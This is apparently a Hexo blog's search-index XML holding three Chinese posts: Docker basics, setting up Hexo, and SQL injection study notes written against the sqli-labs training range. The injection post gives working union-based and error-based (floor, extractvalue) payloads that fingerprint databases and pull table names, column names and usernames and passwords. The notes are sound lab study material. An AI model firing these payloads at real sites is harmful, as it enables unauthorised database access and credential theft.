<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>docker基本使用</title>
    <url>/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">docker安装教程</a></p>
<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>


<h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure>


<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="镜像相关操作"><a href="#镜像相关操作" class="headerlink" title="镜像相关操作"></a>镜像相关操作</h2><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search 镜像名</span><br></pre></td></tr></table></figure>
<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
<h3 id="查看所有镜像"><a href="#查看所有镜像" class="headerlink" title="查看所有镜像"></a>查看所有镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/images.png" alt="image-20210417215354480"></p>
<h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 本机端口：容器端口 镜像名称</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参数解释：</p>
<p>-d 镜像在后台运行</p>
<p>-p 指定本机与容器内部交互的端口 -P则是随机开放一个端口与容器内部ID映射</p>
<p>也就是将后面的<em>acgpiano/sqli-labs的80端口</em>映射到前面的主机某一端口</p>
</blockquote>
<p>例：<del>把本机的8801端口映射到容器的8801端口</del>，事实证明sqli-labs容器的端口必须是80，不然会失败</p>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/run.png" alt="image-20210417222849702"></p>
<blockquote>
<p>请注意这张图片中的容器端口8801是错误的</p>
</blockquote>
<p>但是会报错，是因为没有开启ipv4转发</p>
<blockquote>
<p><a href="https://blog.csdn.net/yelllowcong/article/details/78295600">IPv4 forwarding is disabled. Networking will not work.</a></p>
</blockquote>
<p>进入配置文件，修改<em>net.ipv4.ip_forward=1</em></p>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/net.ipv4.png" alt="image-20210417222634372"></p>
<p>重启服务并查看修改是否成功</p>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/%E6%9F%A5%E7%9C%8B.png" alt="image-20210417222728689"></p>
<blockquote>
<p>还要记得把刚刚运行镜像的容器删除，不然会有容器已存在的报错</p>
</blockquote>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/sqli-labs%E7%95%8C%E9%9D%A2.png" alt="image-20210418160119935"></p>
<blockquote>
<p>成功访问</p>
</blockquote>
<h2 id="容器的相关操作"><a href="#容器的相关操作" class="headerlink" title="容器的相关操作"></a>容器的相关操作</h2><h3 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker ps -a 查看运行过的容器</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/ps.png" alt="image-20210417223707346"></p>
<h3 id="进入容器内部"><a href="#进入容器内部" class="headerlink" title="进入容器内部"></a>进入容器内部</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/exec.png" alt="image-20210417223949376"></p>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/sqli-labs%E9%85%8D%E7%BD%AE.png" alt="image-20210418160159989"></p>
<h3 id="退出容器-exit"><a href="#退出容器-exit" class="headerlink" title="退出容器 exit"></a>退出容器 exit</h3><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop 容器id</span><br></pre></td></tr></table></figure>
<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure>
<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像id</span><br></pre></td></tr></table></figure>
<blockquote>
<p>删除容器和镜像时需要注意的是：</p>
<p>因为是镜像启动后会产生容器，要删除镜像的话必须先删除容器</p>
</blockquote>
<h2 id="构建镜像并发布自己的项目"><a href="#构建镜像并发布自己的项目" class="headerlink" title="构建镜像并发布自己的项目"></a>构建镜像并发布自己的项目</h2><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">详见大佬博客</a></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo初使用</title>
    <url>/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>写在前面：由于这个hexo框架是迁移过来的，没有讲到一些详细的配置，<a href="https://www.pianshen.com/article/9290564319/">这个博主的步骤比较详细</a></p>
</blockquote>
<h2 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h2><ul>
<li>Node.js</li>
<li>git</li>
<li>hexo</li>
<li>GitHub账号</li>
</ul>
<h2 id="新建一个仓库"><a href="#新建一个仓库" class="headerlink" title="新建一个仓库"></a>新建一个仓库</h2><p>命名格式：自己的用户名+github.io</p>
<h2 id="使用git-bash"><a href="#使用git-bash" class="headerlink" title="使用git bash"></a>使用git bash</h2><p>右键<em>git bash</em></p>
<p>配置全局变量,并生成密钥</p>
<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503181732696.png" alt="image-20210503181732696"></p>
<h2 id="修改博客配置文件"><a href="#修改博客配置文件" class="headerlink" title="修改博客配置文件"></a>修改博客配置文件</h2><p>打开_config.yml文件，修改<em>type,repository,branch</em></p>
<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503205250686.png" alt="image-20210503205250686"></p>
<blockquote>
<p>这里有一个坑是，当配置好之后还要在github上的这个仓库中<em>设置github pages里面branch为master</em></p>
</blockquote>
<h2 id="安装git插件并且部署到github上"><a href="#安装git插件并且部署到github上" class="headerlink" title="安装git插件并且部署到github上"></a>安装git插件并且部署到github上</h2><ul>
<li>npm install hexo-deployer-git –save</li>
</ul>
<blockquote>
<p>要在博客目录下右键git bash运行</p>
</blockquote>
<ul>
<li>hexo clean （清除缓存和静态文件）</li>
<li>hexo g （生成静态文件）</li>
<li>hexo d （部署）</li>
</ul>
<p>使用<em>hexo s</em>（启动服务）可以进行本地浏览</p>
<p><a href="https://hexo.io/zh-cn/docs/commands.html">hexo指令</a></p>
<blockquote>
<p>还可以绑定域名，使用一些其他主题等，更多花样等你解锁</p>
</blockquote>
<h2 id="踩的一些坑"><a href="#踩的一些坑" class="headerlink" title="踩的一些坑"></a>踩的一些坑</h2><h3 id="md语法规范"><a href="#md语法规范" class="headerlink" title="md语法规范"></a>md语法规范</h3><p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161203383.png" alt="image-20210504161203383"></p>
<p>这是由于<code>hexo n &quot;新建的md文件名&quot;</code>（新建一篇文章）时生成的md文件标注语法不规范</p>
<p>这里的<code>tag</code>和<code>categories</code>后都要加空格才行</p>
<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161835965.png" alt="image-20210504161835965"></p>
<h3 id="解决图片无法显示的问题"><a href="#解决图片无法显示的问题" class="headerlink" title="解决图片无法显示的问题"></a>解决图片无法显示的问题</h3><p>除此之外就是一些其他设置</p>
<ul>
<li>安装插件</li>
<li>_config.yml选项设置</li>
<li>使用相对路径</li>
</ul>
<blockquote>
<p>最最最重要的是<strong>图片路径要使用相对路径</strong></p>
</blockquote>
<p><a href="https://www.jianshu.com/p/3db6a61d3782">hexo使用markdown图片无法显示问题</a></p>
<h3 id="添加背景图片的路径问题"><a href="#添加背景图片的路径问题" class="headerlink" title="添加背景图片的路径问题"></a>添加背景图片的路径问题</h3><p>图片直接放在<em>public</em>下的<em>images</em>文件夹中使用相对路径调用即可</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入学习</title>
    <url>/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="sql注入学习"><a href="#sql注入学习" class="headerlink" title="sql注入学习"></a>sql注入学习</h1><h2 id="类型划分"><a href="#类型划分" class="headerlink" title="类型划分"></a>类型划分</h2><h3 id="以注入类型划分"><a href="#以注入类型划分" class="headerlink" title="以注入类型划分"></a>以注入类型划分</h3><p>数字型注入</p>
<p>字符型注入</p>
<p>搜索型注入</p>
<p>宽字节注入</p>
<p>Base64变形注入</p>
<h3 id="以提交方式分类"><a href="#以提交方式分类" class="headerlink" title="以提交方式分类"></a>以提交方式分类</h3><p>GET注入</p>
<p>POST注入</p>
<p>Cookie注入</p>
<p>HTTP头注入（XFF注入、UA注入、REFERER注入）</p>
<h3 id="以获取信息的方式分类"><a href="#以获取信息的方式分类" class="headerlink" title="以获取信息的方式分类"></a>以获取信息的方式分类</h3><p>联合注入</p>
<p>报错注入</p>
<p>布尔盲注</p>
<p>时间盲注</p>
<p>堆查询注入</p>
<h2 id="判断是否存在注入点及其类型"><a href="#判断是否存在注入点及其类型" class="headerlink" title="判断是否存在注入点及其类型"></a>判断是否存在注入点及其类型</h2><h4 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h4><p>可以使用单引号，双引号，单括号，双括号判断是否报错，报错的话可能存在sql注入</p>
<h4 id="判断是否为数字型"><a href="#判断是否为数字型" class="headerlink" title="判断是否为数字型"></a>判断是否为数字型</h4><p>若<code>and 1=1</code>页面正常<code>and 1=2</code>页面错误，则为数字型注入</p>
<blockquote>
<p>原理：<code>select * from 表 where id=x</code></p>
</blockquote>
<blockquote>
<p>因为如果是数字型注入的话<code>and 1=2</code>逻辑为假，会返回错误</p>
</blockquote>
<h4 id="判断是否为字符型"><a href="#判断是否为字符型" class="headerlink" title="判断是否为字符型"></a>判断是否为字符型</h4><p>若<code>&#39;and &#39;1&#39;=&#39;1 </code>页面正常，<code>&#39;and &#39;1&#39;=&#39;2</code>页面错误，则为字符型</p>
<blockquote>
<p>原理：<code>select * from 表 where id=&#39;参数&#39;</code></p>
</blockquote>
<blockquote>
<p>这里的sql语句相当于<code>select * from 表名 where id=&#39;参数&#39;and &#39;1&#39;=&#39;1&#39;</code>因为这里的参数是字符类型，而这样构造sql语句正好是字符类型</p>
</blockquote>
<p>  <strong>两者最大的区别就是字符型需要单引号来闭合，而数字型不需要</strong></p>
<h4 id="判断是否为搜索型"><a href="#判断是否为搜索型" class="headerlink" title="判断是否为搜索型"></a>判断是否为搜索型</h4><p>根据<code>%&#39; and 1=1 and &#39;%&#39;=&#39;</code>(相当于<code>and 1=1</code>)与<code>%&#39; and 1=2 and &#39;%&#39;=&#39;</code>的回显进行判断</p>
<blockquote>
<p>原理：<code>select * from 表 where username like &#39;%$name%&#39;</code></p>
</blockquote>
<blockquote>
<p>相当于<code>select * from 表 where username like &#39;%$name%&#39; and 1=1 and &#39;%&#39;=&#39;%&#39;</code></p>
</blockquote>
<blockquote>
<p>pikachu靶场较详细的实例<a href="https://www.cnblogs.com/Hunter-01001100/p/11628286.html">pikachu-搜索型注入 #手工注入</a></p>
</blockquote>
<p>**PS:**字符型和搜索型注入可能需要注释符对<code>&#39;</code>或<code>%&#39;</code>进行注释，如上面的判断字符型注入的语句可以修改为<code>&#39; and 1=1 # </code>和<code>&#39; and 1=2 #</code>来进行判断，而这里的<code>#</code>就是对sql语句后面的<code>&#39;</code>进行注释，同理搜索型也一样</p>
<h4 id="易出现SQL注入的功能点"><a href="#易出现SQL注入的功能点" class="headerlink" title="易出现SQL注入的功能点"></a><strong>易出现SQL注入的功能点</strong></h4><blockquote>
<p>凡是和数据库有交互的地方都容易出现SQL注入，SQL注入经常出现在登陆页面、涉及获取HTTP头（user-agent / client-ip等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在HTTP头中的  client-ip 和 x-forward-for 等字段处。这些字段是用来记录登陆的 i  p的，有可能会被存储进数据库中从而与数据库发生交互导致sql注入。</p>
</blockquote>
<h2 id="根据特殊表判断数据库类型"><a href="#根据特殊表判断数据库类型" class="headerlink" title="根据特殊表判断数据库类型"></a>根据特殊表判断数据库类型</h2><p>目前接触的大部分都是MySQL，绝大多数的数据库的SQL语句都类似，但是当遇到其他类型的数据库时还是要通过<strong>特殊表</strong>来分辨数据库类型</p>
<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="判断数据库"></p>
<h4 id="不同数据库的特殊表"><a href="#不同数据库的特殊表" class="headerlink" title="不同数据库的特殊表"></a>不同数据库的特殊表</h4><blockquote>
<p>MySQL数据库的特有的表是 <strong>information_schema.tables ,</strong> access数据库特有的表是 <strong>msysobjects</strong> 、SQLServer 数据库特有的表是 <strong>sysobjects</strong> ,oracle数据库特有的表是 <strong>dual</strong></p>
</blockquote>
<p>判断语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Mysql数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from information_schema.tables) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//判断是否是 access数据库</span></span><br><span class="line"><span class="string">http://xxx/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) #</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Sqlserver数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from sysobjects) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//判断是否是Oracle数据库</span></span><br><span class="line"><span class="string">http://xxx/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> dual)<span class="operator">&gt;</span><span class="number">0</span> #</span><br></pre></td></tr></table></figure>
<p>对于MySQL数据库，<strong>information_schema</strong>数据库中的表是一个视图，都是只读的，不能进行增删改的操作</p>
<blockquote>
<p>information_schema数据库是MySQL5.0以上才有</p>
</blockquote>
<h4 id="information-schema表中三个重要的表："><a href="#information-schema表中三个重要的表：" class="headerlink" title="information_schema表中三个重要的表："></a>information_schema表中三个重要的表：</h4><ul>
<li>information_schema.<strong>schemata</strong>该表存储了所有的库名</li>
<li>information_schema.<strong>tables</strong>该表存储了所有的表名</li>
<li>information_schema.<strong>columns</strong>该表存储了所有的列名</li>
</ul>
<h2 id="0x01union联合注入"><a href="#0x01union联合注入" class="headerlink" title="0x01union联合注入"></a>0x01union联合注入</h2><p>适用于页面<strong>有显示列</strong>的注入</p>
<p>首先进行的是判断是否存在注入和确定其注入类型，然后<strong>根据注入类型</strong>依次进行列数判断、可显列、查库，查表、查列、查数据</p>
<p>以下以字符型注入为例（sqli-labs靶场）：</p>
<h3 id="列数判断"><a href="#列数判断" class="headerlink" title="列数判断"></a>列数判断</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by x #</span></span><br></pre></td></tr></table></figure>
<h4 id="可显列"><a href="#可显列" class="headerlink" title="可显列"></a>可显列</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3,...x #</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>对于没有可显列的问题，是因为页面只显示一行数据，可以使用形如<em>id=-1</em>来进行注释或是<code>and 1=2</code>对前面的条件进行否定</p>
</blockquote>
<h3 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h3><h4 id="先来了解一些常用函数"><a href="#先来了解一些常用函数" class="headerlink" title="先来了解一些常用函数"></a>先来了解一些常用函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">·  version() ：数据库的版本</span><br><span class="line"></span><br><span class="line">·  database() :当前所在的数据库</span><br><span class="line"></span><br><span class="line">·  @@basedir : 数据库的安装目录</span><br><span class="line"></span><br><span class="line">·  @@datadir ： 数据库文件的存放目录</span><br><span class="line"></span><br><span class="line">·  user() ： 数据库的用户</span><br><span class="line"></span><br><span class="line">·  current_user() : 当前用户名</span><br><span class="line"></span><br><span class="line">·  system_user() : 系统用户名</span><br><span class="line"></span><br><span class="line">·  session_user() :连接到数据库的用户名</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),system_user() --+</span></span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/system_user().png" alt="image-20210509112349669"></p>
<h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><p>已知数据库<code>security</code>查表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; --+</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>group_concat(username) ：</strong>将username数据查询在一起，用逗号连接</p>
</blockquote>
<h4 id="information-schema-tables表中记录了所有的表名"><a href="#information-schema-tables表中记录了所有的表名" class="headerlink" title="information_schema.tables表中记录了所有的表名"></a><em>information_schema.tables</em>表中记录了所有的表名</h4><h4 id="table-schema列记录了所有数据库的库名"><a href="#table-schema列记录了所有数据库的库名" class="headerlink" title="table_schema列记录了所有数据库的库名"></a><em>table_schema</em>列记录了所有数据库的库名</h4><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/information_schema%E8%A1%A8table_schema%E5%88%97.png" alt="image-20210509115335643"></p>
<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E8%A1%A8.png" alt="image-20210509115550488"></p>
<h3 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot; --+</span></span><br></pre></td></tr></table></figure>
<h4 id="information-schema-columns表中记录了所有的列名"><a href="#information-schema-columns表中记录了所有的列名" class="headerlink" title="information_schema.columns表中记录了所有的列名"></a><em>information_schema.columns</em>表中记录了所有的列名</h4><h4 id="table-name列中记录了所有的表名"><a href="#table-name列中记录了所有的表名" class="headerlink" title="table_name列中记录了所有的表名"></a><em>table_name</em>列中记录了所有的表名</h4><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E5%88%97.png" alt="image-20210509122157896"></p>
<h3 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(id,&#x27;</span><span class="comment">---&#x27;,username,&#x27;---&#x27;,password),3 from users --+</span></span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E6%95%B0%E6%8D%AE.png" alt="image-20210509122715852"></p>
<h2 id="0x02-报错注入"><a href="#0x02-报错注入" class="headerlink" title="0x02 报错注入"></a>0x02 报错注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>数据库查询的返回结果并没有在页面中显示，但是会显示数据库的报错信息。可以通过构造数据库报错语句，从报错信息中获取到想要的内容</p>
<h3 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h3><p>利用<strong>count()<strong>、</strong>rand()<strong>、</strong>floor()<strong>、</strong>group by</strong>函数结合在一起产生的注入，缺一不可</p>
<h4 id="关键函数学习"><a href="#关键函数学习" class="headerlink" title="关键函数学习"></a>关键函数学习</h4><h5 id="rand-是随机函数"><a href="#rand-是随机函数" class="headerlink" title="rand()是随机函数"></a>rand()是随机函数</h5><p>通过一个固定的随机数0之后，可以形成固定的伪随机序列（就是rand(0)产生的数据是可预知的）</p>
<h5 id="floor-是取整函数"><a href="#floor-是取整函数" class="headerlink" title="floor()是取整函数"></a>floor()是取整函数</h5><p>floor(rand(0)*2)就是对rand(0)产生的随机序列乘2之后取整，结果也是固定的</p>
<h5 id="group-by是分组函数，将相同的数据分为一组"><a href="#group-by是分组函数，将相同的数据分为一组" class="headerlink" title="group by是分组函数，将相同的数据分为一组"></a>group by是分组函数，将相同的数据分为一组</h5><h5 id="count-是统计结果的行数"><a href="#count-是统计结果的行数" class="headerlink" title="count(*)是统计结果的行数"></a>count(*)是统计结果的行数</h5><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5.png" alt="image-20210509183416177"></p>
<p>形如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//分解来看</span></span><br><span class="line"><span class="string">concat(user(),floor(rand(0)*2))x起了个别名，也就是相当于concat(user(),floor(rand(0)*2))=x</span></span><br><span class="line"><span class="string">ps:这里的user()是要查询的函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">同理(select count(*),x from information_schema.tables group by x)=a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">也就是select 1 from a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>


<p>详细原理分析：</p>
<p><a href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究</a></p>
<p>以sqli-labs中less6为例</p>
<p>union注入不会回显列信息，故使用报错注入</p>
<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/less6.png" alt="image-20210509204534799"></p>
<h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot;and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br><span class="line"></span><br><span class="line">database()的位置可以嵌套sql语句进行查询</span><br><span class="line"></span><br><span class="line">//也可以通过information_schema.schemata表中的schema_name列查库</span><br><span class="line">(select schema_name from information_schema.schemata limit 0,1)</span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="image-20210509205248015"></p>
<blockquote>
<p>security后面的1是floor(rand(0)*2)产生的数字1</p>
</blockquote>
<h4 id="查表-1"><a href="#查表-1" class="headerlink" title="查表"></a>查表</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>这样查询的结果是只会显示一个字段，不加`limit <span class="number">0</span>,<span class="number">1</span>`又会报错`Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span>`</span><br><span class="line"></span><br><span class="line">解决办法：使用group_concat()函数查出所有内容</span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot;)</span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/table_name.png" alt="table_name"></p>
<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/group_concat(table_name).png" alt="group_concat(table_name)"></p>
<h4 id="查列，查数据"><a href="#查列，查数据" class="headerlink" title="查列，查数据"></a>查列，查数据</h4><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%9F%A5%E5%88%97.png" alt="image-20210510090611516"></p>
<p>但是在查数据时会遇见一个奇怪的问题，使用*group_concat()*也出不来数据</p>
<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/group_concat(id,username,password).png" alt="group_concat(id,username,password)"></p>
<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80650540">floor()报错注入</a></p>
<h3 id="ExtractValue报错注入"><a href="#ExtractValue报错注入" class="headerlink" title="ExtractValue报错注入"></a>ExtractValue报错注入</h3><blockquote>
<p>MySQL 5.1.5版本后才包含ExtractValue()和UpdateXML()这2个函数</p>
</blockquote>
<h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p>extractvalue(xml_document,xpath_string)</p>
<blockquote>
<p>XML_document 是 String 格式，为 XML 文档对象的名称</p>
<p>XPath_string (Xpath 格式的字符串)</p>
</blockquote>
<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>从目标XML中返回包含所查询值的字符串（返回结果限制在32位字符）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))</span><br><span class="line"><span class="number">0x7e</span>是<span class="operator">~</span>的ASCII码</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>将<span class="keyword">user</span>()换成其他payload</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>


<p>查库查表正常进行就行</p>
<h4 id="有意思的来了"><a href="#有意思的来了" class="headerlink" title="有意思的来了"></a>有意思的来了</h4><p>当查列的时候会因为超过最大限度32位只会显示部分数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;</span><br><span class="line">and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; ),0x7e))--+</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/extractvalue%E6%9F%A5%E5%88%97.png" alt="image-20210510100413545"></p>
<p>参考文章：</p>
